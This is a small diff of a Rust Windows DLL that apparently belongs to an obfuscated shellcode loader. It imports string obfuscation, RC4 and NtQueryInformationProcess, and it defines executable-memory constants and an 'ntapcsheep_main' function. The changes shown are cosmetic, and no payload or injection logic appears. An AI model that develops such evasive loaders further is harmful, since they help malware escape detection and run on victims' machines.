@@ -9,8 +9,8 @@ use windows::core::s;
 use windows::Win32::Foundation::{BOOL, HINSTANCE, HWND};
 use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
 use windows::Win32::UI::WindowsAndMessaging::MessageBoxA;
-//string obfuscation on compile time
 use ntapi::ntpsapi::{NtQueryInformationProcess, PROCESS_BASIC_INFORMATION};
+//string obfuscation on compile time
 use obfstr::obfstr;
 use rand::Rng;
 use rc4::{KeyInit, Rc4, StreamCipher};
@@ -78,6 +78,7 @@ const MEM_COMMIT: u32 = 0x1000;
 const MEM_RESERVE: u32 = 0x2000;
 const PAGE_EXECUTE_READ: u32 = 0x20;
 
+#[allow(dead_code)]
 fn ntapcsheep_main() {
     //some current process stuff
 
